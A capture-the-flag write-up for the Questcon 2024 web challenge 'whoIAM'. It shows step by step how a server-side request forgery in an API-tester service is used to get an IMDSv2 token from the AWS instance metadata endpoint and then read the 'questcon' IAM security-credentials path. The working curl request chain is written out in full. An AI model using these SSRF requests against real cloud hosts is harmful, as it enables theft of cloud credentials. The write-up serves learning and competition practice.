## whoIAM Questcon 2024 [390pts]

**Category:** Web
**Solves:** 23

## Description
You’ve got your hands on the Professor’s secure API Tester, but something’s not right. Beneath its polished surface lies a flaw that could expose the hidden secrets. However, the Professor’s defenses are airtight—standard methods are blocked.

No need to use tools do it manually to get the flag or else you will get the ssh keys!

Author: TheProfessor

Can you outsmart the system and get the credentials of questcon? http://15.207.100.240


## Solution


First read these articles:
```
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf

https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
```

It's related to steal credentials of AWS EC2 environments.

First we should steal access token via ssrf access to internal IP in docker env.

```bash
$ curl -X POST "http://15.207.100.240/request" --data '{"method":"PUT","url":"http://169.254.169.254/latest/api/token","headers":{"X-aws-ec2-metadata-token-ttl-seconds": 21600},"body":""}' -H "Content-Type: application/json"
AQAEALMU0jjnTsQb2M7dCgLGTpsrQI4ZTo2MWsjTLfoLG2lkH85uyA==
```

Now let's fuzz a little bit in the environment:
```bash
$ curl -X POST "http://15.207.100.240/request" --data '{"method":"GET","url":"http://169.254.169.254/latest/meta-data","headers":{"X-aws-ec2-metadata-token": "AQAEALMU0jjnTsQb2M7dCgLGTpsrQI4ZTo2MWsjTLfoLG2lkH85uyA=="},"body":""}' -H "Content-Type: application/json"
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
managed-ssh-keys/
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system⏎         
```

I tried to read identity-credentials but not working:
```bash
$ curl -X POST "http://15.207.100.240/request" --data '{"method":"GET","url":"http://169.254.169.254/latest/meta-data/identity-credentials/","headers":{"X-aws-ec2-metadata-token": "AQAEALMU0jjnTsQb2M7dCgLGTpsrQI4ZTo2MWsjTLfoLG2lkH85uyA=="},"body":""}' -H "Content-Type: application/json"
try harder! not so easy
```

Seem there is a protection on fetching it.
Also for security-credentials:
```bash
$ curl -X POST "http://15.207.100.240/request" --data '{"method":"GET","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials","headers":{"X-aws-ec2-metadata-token": "AQAEALMU0jjnTsQb2M7dCgLGTpsrQI4ZTo2MWsjTLfoLG2lkH85uyA=="},"body":""}' -H "Content-Type: application/json"
Nahh, you can't have that
```

But by some guessing, that they want the competition security info, i tried to fetch questcon key and got the flag:
```bash
$ curl -X POST "http://15.207.100.240/request" --data '{"method":"GET","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/questcon","headers":{"X-aws-ec2-metadata-token": "AQAEALMU0jjnTsQb2M7dCgLGTpsrQI4ZTo2MWsjTLfoLG2lkH85uyA=="},"body":""}' -H "Content-Type: application/json"
QUESTCON{IMDS_3s_4r3_4w3s0m3_t0_ha4k}
```
